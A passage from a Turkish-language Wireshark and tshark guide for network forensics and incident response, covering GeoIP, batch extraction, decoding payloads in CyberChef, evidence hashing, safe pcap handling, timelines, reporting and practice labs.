- `ip.geoip.asnum == 13335` → belirli ağ sahibine (ASN) ait trafik

**Menü / araç:**

- Edit ▸ Preferences ▸ Name Resolution ▸ MaxMind database directories → GeoLite2 veritabanını tanıt
- Statistics ▸ Endpoints ▸ IPv4 → "Country", "City", "AS Number" sütunları (GeoIP açıksa)

**Filtreden sonra yol tarifi:**

1. MaxMind GeoLite2 veritabanını Preferences'ta tanıt; IP'ler ülke/şehir/ASN ile zenginleşir.
2. Endpoints penceresinde ülke sütununa göre sırala; iş bağlamına uymayan ülkeleri işaretle.
3. ASN, barındırma sağlayıcısını gösterir; bilinen "kurşun geçirmez" (bulletproof) hosting'ler şüphelidir.
4. GeoIP yaklaşıktır ve VPN/proxy ile değişir; tek başına kanıt değil, bağlam sağlar.

**Terimler:**

- **GeoIP**: IP'yi coğrafi konuma eşleyen veritabanı.
- **ASN**: Autonomous System Number; IP bloğunun sahibi ağ.

> **Anlık karar:** GeoIP "nereye" sorusuna renk katar ama kesinlik değildir. "Rusya'ya gitti" dolaylı kanıttır; VPN olabilir.


</details>

<details>
<summary><strong>237 · tshark ile toplu çıkarım ve otomasyon</strong></summary>

**Metafor:** Elle tek tek saymak yerine bir muhasebe programına defteri verip raporu almak.

**Senden istenen:** "Yüzlerce paketten toplu veri nasıl çıkarırım?", "Analizi nasıl otomatikleştiririm?"

**Komut satırı:**

```bash
tshark -r kayit.pcapng -Y 'http.request' -T fields -e ip.src -e http.host -e http.request.uri -E header=y
tshark -r kayit.pcapng -q -z conv,ip
tshark -r kayit.pcapng -q -z io,phs
tshark -r kayit.pcapng -Y 'dns.flags.response==0' -T fields -e dns.qry.name | sort | uniq -c | sort -rn
```

**Filtreden sonra yol tarifi:**

1. `-T fields -e alan` ile istediğin alanları sütun sütun çıkar; `-E header=y` başlık ekler, `-E separator=,` CSV yapar.
2. `-z` istatistik üretir: `conv,ip` (konuşmalar), `io,phs` (protokol hiyerarşisi), `endpoints,ip`.
3. Çıktıyı `sort | uniq -c | sort -rn` ile frekans tablosuna çevir; nadir olanı bul.
4. Tekrarlayan analizleri betik haline getir; aynı soruları her pcap'e otomatik sor.

**Terimler:**

- **tshark**: Wireshark'ın komut satırı kardeşi; aynı filtre dilini kullanır.
- **-z**: İstatistik üretme bayrağı.

> **Anlık karar:** GUI keşif için, tshark toplu iş için. "Kaç farklı X var?" sorularını tshark + uniq saniyede yanıtlar.


</details>

<details>
<summary><strong>238 · CyberChef ile kodlanmış/şifreli veriyi çözmek</strong></summary>

**Metafor:** Şifreli bir mesajı çözmek için her tür çözücünün bulunduğu bir mutfak; malzemeleri sırayla geçirirsin.

**Senden istenen:** "Çıkardığım veri base64/hex/gzip/XOR; nasıl okunur hale getiririm?"

**Filtreler (araştırma yolu):**

- `http.file_data` → çözülecek kodlu gövde
- `dns.txt` → kodlu TXT içeriği

**Filtreden sonra yol tarifi:**

1. Veriyi Wireshark'tan çıkar (Follow Stream ▸ Raw veya alan değerini kopyala).
2. CyberChef'e yapıştır; "Magic" tarifi kodlamayı otomatik tahmin etmeye çalışır.
3. Zincir kur: From Base64 → Gunzip → (gerekiyorsa) XOR Brute Force → çıktı.
4. Çıkan sonucu değerlendir: PowerShell komutu, URL, dosya başlığı (MZ, PK), flag.
5. Çok aşamalı gizlemelerde her katmanı ayrı çöz; ara çıktıyı tekrar Magic'e ver.

**Terimler:**

- **CyberChef**: Kodlama/şifre çözme için tarayıcı tabanlı araç ("siber aşçı").
- **Recipe**: CyberChef'te sıralı işlem zinciri.

> **Anlık karar:** Çözemezsen katman sayısını artır: çoğu zararlı base64 → gzip → XOR gibi 2-3 katman kullanır. Sırayı deneyerek bul.


</details>

<details>
<summary><strong>239 · İşaretleme ve profil: tekrar eden analizleri hızlandırmak</strong></summary>

**Metafor:** Sık kullandığın aletleri el altında, hazır bir alet kemerinde tutmak.

**Senden istenen:** "Her vakada aynı filtreleri tekrar yazıyorum, nasıl hızlanırım?"

**Filtreler (araştırma yolu):**

- `tcp.flags.syn == 1 && tcp.flags.ack == 0` → buton yapılacak örnek: "taramalar"

**Menü / araç:**

- Filtre çubuğunun sağındaki yer imi (şerit) ikonu ▸ Save this filter → kayıtlı filtreler
- Filtre çubuğunun sağındaki "+" ▸ filtre butonu ekle (tek tıkla uygula)
- Analyze ▸ Display Filter Macros → uzun filtrelere kısa ad ver

**Filtreden sonra yol tarifi:**

1. En sık kullandığın 8-10 filtreyi buton olarak ekle (taramalar, C2 adayları, düz metin parolalar, indirmeler).
2. Uzun ve tekrarlayan filtreleri Display Filter Macro'ya çevir; `${isim}` ile çağır.
3. Bunları bir DFIR profiline kaydet (Problem 019); profil taşınabilir.
4. Filtre butonlarını vaka türüne göre grupla (web vakası, AD vakası).

**Terimler:**

- **Filter button**: Tek tıkla uygulanan kayıtlı filtre.
- **Display filter macro**: Uzun filtreye verilen kısa takma ad.

> **Anlık karar:** İyi analist filtre ezberlemez, alet kemerini kurar. Bir kez hazırla, her vakada dakikalar kazan.


</details>

<details>
<summary><strong>240 · Protokol tercihlerini ayarlamak (reassembly, checksum)</strong></summary>

**Metafor:** Bir makinenin ayarlarını işe göre optimize etmek; yanlış ayar hem yavaşlatır hem yanlış sonuç verir.

**Senden istenen:** "Checksum hataları neden bu kadar çok?", "Dosyalar neden birleşmiyor?"

**Filtreler (araştırma yolu):**

- `tcp.checksum.status == "Bad"` → hatalı görünen checksum'lar (genelde yanlış alarm)
- `tcp.analysis.retransmission` → reassembly ayarı yanlışsa şişebilir

**Filtreden sonra yol tarifi:**

1. Checksum offload: modern kartlar checksum'u donanımda hesaplar, yakalama öncesi olduğu için Wireshark "bad" görür. Edit ▸ Preferences ▸ Protocols ▸ TCP ▸ "Validate checksum" kapat.
2. TCP reassembly: dosya çıkarma ve HTTP için "Allow subdissector to reassemble TCP streams" açık olmalı; performans için gerektiğinde kapat.
3. "Bad checksum" yağmuru görürsen önce kendi makinenin offload'ını düşün, gerçek ağ sorunu sanma.
4. Ayarları DFIR profiline kaydet.

**Terimler:**

- **Checksum offload**: Checksum hesabının ağ kartına bırakılması.
- **Reassembly**: Parçalı veriyi birleştirme.

> **Anlık karar:** "Bad checksum" neredeyse her zaman kendi kartının offload'ıdır, saldırı değil. Önce ayarı kontrol et.


</details>

<details>
<summary><strong>241 · NAT arkası: gerçek iç IP'yi bulmak</strong></summary>

**Metafor:** Bir apartmanın tüm dairelerinin dışarıya tek bir ortak posta kutusu adresi kullanması; mektuba bakınca hangi daireden geldiği belli olmaz.

**Senden istenen:** "Dış kayıtta herkes aynı IP; gerçek kaynağı nasıl bulurum?"

**Filtreler (araştırma yolu):**

- `ip.src == 203.0.113.1` → NAT'ın dış IP'si (hepsi aynı görünür)
- `tcp.srcport` → NAT sonrası port, bazen iç oturumu ayırt eder

**Filtreden sonra yol tarifi:**

1. NAT dışında yakaladıysan iç IP'leri göremezsin; tüm iç hostlar tek genel IP görünür.
2. İç kaynağı ayırt etmek için NAT'ın iç tarafından alınmış bir kayıt veya firewall/NAT loglarının zaman+port eşleşmesi gerekir.
3. Uygulama katmanı ipuçları yardımcı olur: HTTP içindeki X-Forwarded-For başlığı, farklı User-Agent'lar, farklı oturum çerezleri iç hostları ayırabilir.
4. Raporda "kaynak NAT arkasında; iç host için NAT logu gerekli" diye sınırı belirt.

**Terimler:**

- **NAT**: Network Address Translation; birçok iç IP'yi tek dış IP'ye çevirme.
- **X-Forwarded-For**: Proxy/NAT arkasındaki gerçek istemci IP'sini taşıyabilen HTTP başlığı.

> **Anlık karar:** NAT dışındaki kayıtta "kim" sorusunun tam cevabı yoktur. NAT logu olmadan ancak uygulama ipuçlarıyla tahmin edersin.


</details>

<details>
<summary><strong>242 · Kanıt zinciri (chain of custody) ve dosya bütünlüğü</strong></summary>

**Metafor:** Mahkemeye giden delilin, toplandığı andan itibaren kimin elinden geçtiğinin ve değişmediğinin mühürlü kaydı.

**Senden istenen:** "Bulgularım hukuken/kurumsal olarak geçerli olsun istiyorum."

**Komut satırı:**

```bash
sha256sum kayit.pcapng > kayit.pcapng.sha256
capinfos -H -c -e -a kayit.pcapng
```

**Filtreden sonra yol tarifi:**

1. Kanıtı aldığın anda SHA256 hash'ini al ve zaman damgasıyla kaydet.
2. Orijinali salt okunur sakla; tüm analizi bir kopya üzerinde yap.
3. Her işlemi kaydet: kim, ne zaman, hangi dosyadan, hangi aracı, ne için kullandı.
4. Dışa aktardığın her alt dosyanın da hash'ini al ve orijinalle ilişkilendir.
5. Raporda kanıt kimliğini ver: dosya adı, boyut, SHA256, toplama zamanı ve kaynağı.

**Terimler:**

- **Chain of custody**: Kanıtın el değiştirme ve bütünlük kaydı.
- **Hash**: Dosya parmak izi; tek bit değişse değişir.

> **Anlık karar:** Hash'siz kanıt, mührü kopmuş zarf gibidir. İlk iş hash; son iş hash'in hâlâ aynı olduğunu göstermek.


</details>

<details>
<summary><strong>243 · Pcap'i güvenli incelemek (zararlı tetiklememek)</strong></summary>

**Metafor:** Patlayıcı bir delili incelerken onu patlatmadan, uzaktan ve korumalı bir ortamda çalışmak.

**Senden istenen:** "İncelerken yanlışlıkla zararlıyı çalıştırmaktan/uyarmaktan nasıl kaçınırım?"

**Filtreler (araştırma yolu):**

- `dns.qry.name` → zararlı alanları SADECE pcap içinden oku, canlı sorgulama

**Menü / araç:**

- View ▸ Name Resolution ▸ "Resolve network addresses" kapalı; harici DNS kapalı

**Filtreden sonra yol tarifi:**

1. Harici isim çözümlemeyi kapat; açık olursa Wireshark zararlı alanları canlı sorgular (iz bırakır, bugünkü cevabı verir).
2. Analizi internetten izole bir ortamda (VM, air-gapped) yap.
3. Çıkardığın dosyaları asla çift tıklama; sadece hash'le ve izole analiz için sakla.
4. Zararlı alan/IP'leri istihbarat servisinde kontrol ederken analiz makinesini değil ayrı/pasif bir kaynağı kullan.

**Terimler:**

- **OPSEC**: Operasyonel güvenlik; analiz ederken kendini ve kurumu açık etmeme.
- **Air-gapped**: İnternetten fiziksel olarak kopuk ortam.

> **Anlık karar:** Analiz bilgisayarından zararlı alanı canlı sorgulamak saldırganı uyarır ve iz bırakır. Her şey pcap'in içinden, çözümleme kapalı.


</details>

<details>
<summary><strong>244 · Bulguları zaman çizelgesine dökmek</strong></summary>

**Metafor:** Dağınık ipuçlarını tarih sırasına dizip olayın filmini kurmak.

**Senden istenen:** "Bütün bulgularımı nasıl tutarlı bir anlatıya çeviririm?"

**Filtreler (araştırma yolu):**

- `frame.marked == 1` → işaretlenmiş tüm bulgular
- `frame.comment` → yorumlu paketler

**Komut satırı:**

```bash
tshark -r kayit.pcapng -Y 'frame.comment' -T fields -e frame.time_utc -e frame.comment
```

**Filtreden sonra yol tarifi:**

1. Her önemli bulguda paketi işaretle ve "NE + NEDEN" yorumu ekle (Problem 020).
2. Analiz sonunda frame.comment'leri UTC zamanla birlikte çıkar; bu senin ham zaman çizelgen.
3. Olayları kill chain aşamalarına yerleştir: ilk erişim → kurulum → C2 → keşif → yanal hareket → sızdırma.
4. Her satıra kanıt referansı ver (paket numarası, stream, dosya hash'i).
5. Boşlukları (görülmeyen adımlar) ayrıca işaretle ve hangi ek kaynağın gerektiğini yaz.

**Terimler:**

- **Timeline**: Zamana göre sıralı olay listesi; raporun omurgası.
- **Kill chain**: Saldırının aşamaları.

> **Anlık karar:** Zaman çizelgesi rapordan önce gelir. Önce olayları sıraya diz, sonra anlatıyı yaz; tersi karışıklık olur.


</details>

<details>
<summary><strong>245 · DFIR raporunu yazmak: bulgudan anlatıya</strong></summary>

**Metafor:** Dedektifin topladığı kanıtları mahkemede anlaşılır bir hikâyeye çevirmesi; jüri teknik değil, anlatı ister.

**Senden istenen:** "Analizimi nasıl profesyonel bir rapora dönüştürürüm?"

**Filtreler (araştırma yolu):**

- `frame.marked == 1 || frame.comment` → rapora girecek kanıtlar

**Filtreden sonra yol tarifi:**

1. Yönetici özeti ile başla: ne oldu, ne zaman, etki ne, tek paragraf, teknik olmayan dille.
2. Zaman çizelgesini ver: UTC zamanlı, kill chain aşamalı, her satırda kanıt referansı.
3. Teknik detay bölümü: her bulgu için filtre, paket numarası, ekran görüntüsü/alıntı ve yorumu.
4. IOC listesi ekle: IP, alan, hash, URL, port (Problem 194).
5. Etki ve öneriler: etkilenen sistemler, izolasyon, temizlik, önleyici tedbirler.
6. Analizin sınırlarını dürüstçe belirt: şifreli/görülemeyen kısımlar, sensör kör noktaları, eksik kayıt.

**Terimler:**

- **Executive summary**: Teknik olmayan yöneticiler için özet.
- **Remediation**: Düzeltme/giderme önerileri.

> **Anlık karar:** Rapor kanıt listesi değil, kanıtlarla desteklenmiş bir anlatıdır. "Ne oldu" sorusunu bir hikâye gibi, ama her cümlesi kanıta bağlı yanıtla.


</details>

<details>
<summary><strong>246 · Ekran görüntüsü ve kanıt alıntısı almak</strong></summary>

**Metafor:** Delili fotoğraflarken hem yakın çekim (detay) hem geniş açı (bağlam) almak.

**Senden istenen:** "Raporuma hangi ekran görüntülerini, nasıl koymalıyım?"

**Filtreler (araştırma yolu):**

- `frame.number == 12345` → tek bir kanıt paketini izole edip görüntüle

**Menü / araç:**

- File ▸ Export Packet Dissections ▸ As Plain Text → seçili paketlerin metin dökümü
- Follow Stream penceresi ▸ içeriği kopyala veya Save as → kanıt alıntısı

**Filtreden sonra yol tarifi:**

1. Hem filtre+sonuç ekranını (bağlam) hem ilgili paketin detay panelini (kanıt) görüntüle.
2. Follow Stream çıktısını metin olarak kaydet; uzun akışları ilgili kısmı vurgulayarak alıntıla.
3. Her görüntüye paket numarası ve UTC zaman ekle; tekrar bulunabilir olsun.
4. Hassas veriyi (parola, kart no, kişisel bilgi) raporda maskele.

**Terimler:**

- **Packet dissection export**: Paket çözümlemesinin metin/CSV/JSON dökümü.

> **Anlık karar:** Kanıt tekrar bulunabilir olmalı: paket numarası + filtre + dosya hash'i birlikte verilirse başkası aynı sonuca ulaşır.


</details>

<details>
<summary><strong>247 · Çıkmaza girince: tıkanınca ne yapmalı?</strong></summary>

**Metafor:** Bir labirentte duvara toslayınca geri dönüp farklı bir koridor denemek; aynı duvara tekrar tekrar yürümemek.

**Senden istenen:** "Hiçbir şey bulamıyorum / takıldım, şimdi ne yapayım?"

**Filtreler (araştırma yolu):**

- `!(arp || dns || mdns || ssdp || llmnr || nbns || icmpv6 || stp)` → gürültüyü at, kalana taze gözle bak

**Filtreden sonra yol tarifi:**

1. Hipotezini değiştir: belki yanlış şeyi arıyorsun. Başka bir saldırı türü varsayımıyla baştan bak.
2. Ölçeği değiştir: paketlerde boğulduysan istatistiklere (Conversations, Protocol Hierarchy, I/O Graph) çık; istatistikte kaybolduysan paketlere in.
3. Gürültüyü at (Problem 015) ve kalan trafiğe taze gözle bak; en nadir olan sıklıkla cevaptır.
4. Zaman penceresini kaydır: olay alarmdan önce başlamış olabilir, geriye bak.
5. Protokolü yeniden değerlendir: tanınmayan "Data" standart dışı porttaki bir protokol olabilir (Decode As).
6. Dışarı anlat: bulgularını birine (veya kâğıda) anlatmak çoğu zaman eksik halkayı gösterir.

**Terimler:**

- **Rubber duck debugging**: Sorunu sesli anlatarak çözme tekniği.
- **Pivoting**: Bir bakış açısından diğerine geçme (paket ↔ istatistik, zaman ↔ host).

> **Anlık karar:** Takılınca aynı filtreyi tekrar deneme. Üç şeyden birini değiştir: hipotezi, ölçeği (paket/istatistik) veya zaman penceresini. Yeni açı, yeni bulgu getirir.


</details>

<details>
<summary><strong>248 · Ağ hızı/performans analizi: yavaşlığın kaynağı ağ mı uygulama mı?</strong></summary>

**Metafor:** Bir siparişin geç gelmesi: kurye mi yavaş (ağ), yoksa mutfak mı yavaş hazırlıyor (uygulama/sunucu)?

**Senden istenen:** "Kullanıcı 'ağ yavaş' diyor; gerçekten ağ mı, sunucu mu?"

**Filtreler (araştırma yolu):**

- `tcp.analysis.initial_rtt > 0.2` → yüksek gidiş-dönüş süresi (ağ gecikmesi)
- `tcp.time_delta > 1` → aynı akışta paketler arası uzun bekleme
- `tcp.analysis.retransmission || tcp.analysis.duplicate_ack` → paket kaybı belirtileri

**Filtreden sonra yol tarifi:**

1. TCP el sıkışmasındaki RTT'ye bak (SYN → SYN-ACK süresi); yüksekse ağ gecikmesi vardır.
2. Veri aktarımında boşluk uygulama tarafından mı (istek sonrası sunucu düşünüyor) yoksa ağdan mı (retransmission) geliyor ayır.
3. Retransmission/duplicate ACK yoğunluğu = paket kaybı = ağ sorunu.
4. İstek gider, cevap uzun süre gelmezse ama kayıp yoksa = sunucu/uygulama yavaş.
5. Statistics ▸ TCP Stream Graphs ▸ Round Trip Time ile görselleştir.

**Terimler:**

- **RTT**: Round Trip Time; gidiş-dönüş gecikmesi.
- **initial_rtt**: El sıkışmadan ölçülen ilk RTT.

> **Anlık karar:** Gecikme el sıkışmada mı (ağ) yoksa istek-cevap arasında mı (sunucu)? Bu ayrım yavaşlık sorununu ikiye böler.


</details>

<details>
<summary><strong>249 · İlgisiz görünen iki olayı ilişkilendirmek (korelasyon)</strong></summary>

**Metafor:** Farklı tanıkların ifadelerini aynı zaman çizelgesine koyunca ortaya çıkan ortak an.

**Senden istenen:** "Bu iki olay (ör. bir DNS sorgusu ve bir bağlantı) aynı saldırının parçası mı?"

**Filtreler (araştırma yolu):**

- `ip.addr == 203.0.113.50 || dns.a == 203.0.113.50` → bir IP'yi hem bağlantıda hem DNS cevabında ara
- `frame.time >= "2024-03-01 02:10:00" && frame.time <= "2024-03-01 02:15:00"` → dar zaman penceresinde her şey

**Filtreden sonra yol tarifi:**

1. Bir göstergeyi (IP/alan/zaman) sabit tut ve farklı protokollerde izini ara.
2. Zaman korelasyonu: olay A'dan hemen sonra olay B oluyorsa (milisaniyeler) muhtemelen bağlantılıdır.
3. Değer korelasyonu: aynı IP/alan/çerez/kullanıcı farklı olaylarda görünüyorsa aynı aktördür.
4. Dar zaman penceresi filtresiyle "o anda başka ne oldu?" sorusunu sor.
5. Korelasyonu kanıt seviyesiyle yaz: zaman yakınlığı "olası", ortak değer "güçlü" kanıttır.

**Terimler:**

- **Korelasyon**: Olaylar arası zaman veya değer ilişkisi.
- **Pivot değeri**: Farklı olayları birbirine bağlayan ortak gösterge.

> **Anlık karar:** İki olay "aynı anda + aynı IP" ise tesadüf değildir. Korelasyonda sabit bir pivot seç, onu her yerde ara.


</details>

<details>
<summary><strong>250 · Öğrenmeye devam: kendi laboratuvarını kurmak ve pratik yapmak</strong></summary>

**Metafor:** Yüzmeyi kitaptan değil suya girerek öğrenmek. Wireshark da ancak gerçek pcap'lerle öğrenilir.

**Senden istenen:** "Bu kılavuzu bitirdim, şimdi nasıl ustalaşırım?"

**Filtreler (araştırma yolu):**

- `http.request || dns || tls.handshake.type == 1` → herhangi bir örnek pcap'te ilk bakış

**Filtreden sonra yol tarifi:**

1. Ücretsiz örnek pcap kaynaklarıyla pratik yap: malware-traffic-analysis.net (gerçek zararlı trafik, cevap anahtarlı alıştırmalar), Wireshark SampleCaptures wiki, CyberDefenders ve Blue Team Labs challenge'ları.
2. Kendi laboratuvarını kur: izole bir VM'de trafik üret (tarama, indirme, basit C2 simülasyonu) ve kendi kaydını analiz et.
3. Her alıştırmada bu kılavuzun karar çerçevesini uygula: triage → hipotez → çekmece seç → doğrula.
4. Çözdüğün her vaka için kısa bir rapor yaz; raporlama kası ayrı çalışır.
5. Zorlandığın problem numarasını not et, o bölümün reflekslerini tekrar et.

**Terimler:**

- **Lab**: Güvenli, izole deney ortamı (genelde sanal makineler).
- **CTF / challenge**: Cevabı bilinen, pratik için hazırlanmış alıştırma.

> **Anlık karar:** Bu kılavuz haritadır, arazi değil. Ustalık, gerçek pcap'lerde kaybolup yeniden yol bulmakla gelir. Haftada bir vaka çöz, altı ayda tanınmaz hale gelirsin.


</details>
